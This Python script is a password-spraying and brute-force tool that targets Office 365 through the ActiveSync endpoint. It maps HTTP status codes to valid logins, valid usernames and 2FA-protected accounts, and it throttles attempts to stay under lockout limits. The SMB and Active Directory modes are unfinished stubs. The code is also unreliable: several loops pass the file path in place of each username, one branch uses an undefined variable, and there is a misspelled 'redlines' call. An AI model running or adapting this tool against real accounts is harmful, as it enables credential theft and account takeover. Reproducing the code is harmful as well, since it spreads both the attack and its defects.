#!/usr/bin/env python3
import platform
import os
import socket
import time
from datetime import datetime
from argparse import ArgumentParser
from threading import Thread
import requests
import os
import sys
import platform
from colorama import init, Fore
from time import sleep

init()

def switch():
    parser = ArgumentParser()
    parser.add_argument('-host','--host', help='hostname, domain or url to bruteforce', required=False)
    parser.add_argument('-m','--mode', help='bruteforce mode to use [o365|smb|other]', required=False,)
    parser.add_argument('-u','--username', help='username to test [cannot be used with -uf or --userfile]', required=False)
    parser.add_argument('-p','--password', help='password to test [cannot be used with -pf or --passfile]', required=False)
    parser.add_argument('-uf','--userfile', help='list of usernames to test [cannot be used with -u or --username]', required=False)
    parser.add_argument('-pf','--passfile', help='list of password to test [cannot be used with -p or --password]', required=False)
    parser.add_argument('-policy','--policy', help='password policy to be applied [attempts,seconds]', required=False)
    #parser.add_argument('-r','--request', help='parse a request file {input file must be in txt}',required=False)
    #parser.add_argument('-t','--thread', help='Number of threads to use [only use with -c or --check]',required=False)
    parser.add_argument('-v','--verbose', help='read output to terminal',required=False, action='store_true')
    return parser.parse_args()

#https://github.com/curesec/tools/blob/master/smb/smb-brute-force.py

def cls():
    os_env = platform.platform()
    if 'Windows' in os_env:
        os.system('cls')
    else:
        os.system('clear')

def banner():
    banner = """
d8888b.  .d88b.  db    db d8b   db d8888b.  .d88b.  
88  `8D .8P  Y8. 88    88 888o  88 88  `8D .8P  Y8. 
88oodD' 88    88 88    88 88V8o 88 88   88 88    88 
88~~~   88    88 88    88 88 V8o88 88   88 88    88 
88      `8b  d8' 88b  d88 88  V888 88  .8D `8b  d8' 
88       `Y88P'  ~Y8888P' VP   V8P Y8888D'  `Y88P

                        from nsfLabs
"""
    print(banner)
        
    
def brute_office(username,password):
    
    if check_o365(username):
        #TODO: run bruter
        header = {"MS-ASProtocolVersion": "14.0"
            }
        LOGIN_URL = "https://outlook.office365.com/Microsoft-Server-ActiveSync"
        STATUS_CODES = {"200": "VALID USERPASS",
                        "401": "VALID USERNAME ONLY",
                        "403": "VALID USERPASS WITH 2FA",
                        "404": "INVALID USERNAME"
                    }
        r = requests.options(LOGIN_URL, headers=header, auth=(username,password), timeout=300)
        
        color = Fore.GREEN+"Login Found: " if r.status_code == 200 else Fore.RED+"Invalid Login: "
        print(color+"{}:{} - {}".format(username,password,STATUS_CODES[str(r.status_code)]))
        
        
    else:
        print(Fore.RED+"[+] Error! Unknown error code")


def sprayAD(host):
    # TODO: run AD spray here
    pass

def check_o365(username):
    isO365 = True
    return isO365

def get_credentials(auth):
    t = type()

def hybrid_office_worker(policy,user,_pass):
    attempts = 1
    max_attempts, timelimit = tuple(policy.split(','))
    timelimit = 60*int(timelimit)
    max_attempts = int(max_attempts) - 1
    print(type(user))
    if isinstance(user, str):
        #this shows we are spraying a single username against a passfile
        try:
            with open(_pass,'r') as passfile:
                for password in passfile.readlines():
                    #This is where we will apply our password policy
                    if attempts == max_attempts:
                        sleep(timelimit)
                        attempts = 1
                    brute_office(user,password.strip("\n"))
                    attempts = attempts + 1
                    sleep(timelimit//max_attempts)
        except Exception as e:
            print(e)
            exit(0)
            
    elif isinstance(_pass, str):
        #this shows we are spraying a single password against a userfile
        try:
            with open(user,'r') as userfile:
                for username in userfile.readlines():
                    #This is where we will apply our password policy
                    if attempts == max_attempts:
                        sleep(timelimit)
                        attempts = 1
                    brute_office(user,password.strip("\n"))
                    attempts = attempts + 1
                    sleep(timelimit//max_attempts)
        except Exception as e:
            print(e)
            exit(0)
    else:
        #this means we are spraying userfile against passfile.
        try:
            with open(_pass, 'r') as passfile, open(user,'r') as userfile:
                for password in passfile.readlines():
                    for username in userfile.redlines():
                        if attempts == max_attempts:
                            sleep(timelimit)
                            attempts = 1
                        #we can try to use threading here
                        brute_office(user,password.strip("\n"))
                        attempts = attempts + 1
                        sleep(timelimit//max_attempts)
        except Exception as e:
            print(e)

def hybrid_smb_worker(policy,username="",password="",userfile="",passfile=""):
    #TODO: Run hybrid bruteforcing here using worker threads
    pass


if __name__ == '__main__':
    cls()
    banner()

    options = switch()

    mode = options.mode
    username = options.username
    password = options.password
    userfile = options.userfile
    passfile = options.passfile
    policy = options.policy

    if username and userfile:
        ArgumentParser().print_usage()
        sys.exit(0)
    if password and passfile:
        ArgumentParser().print_usage()
        sys.exit(0)
    
    
    if username and password:
        single_test = True
    else:
        single_test = False

    # Run o365 bruteforce test
    if mode == "o365":
        print(Fore.BLUE+" Starting Office 365 Password Spraying/Bruteforce")
        if single_test:
            brute_office(username,password)
        else:
            if username and passfile:
                hybrid_office_worker(policy,username,passfile)
            elif userfile and password:
                hybrid_office_worker(policy,userfile,password)
            elif userfile and passfile:
                hybrid_office_worker(policy,userfile,passfile)

    # Run smb spraying test   
    if mode == "smb":
        if single_test:
            sprayAD(username,password)
        else:
            hybrid_smb_worker(username,password,userfile,passfile,policy)
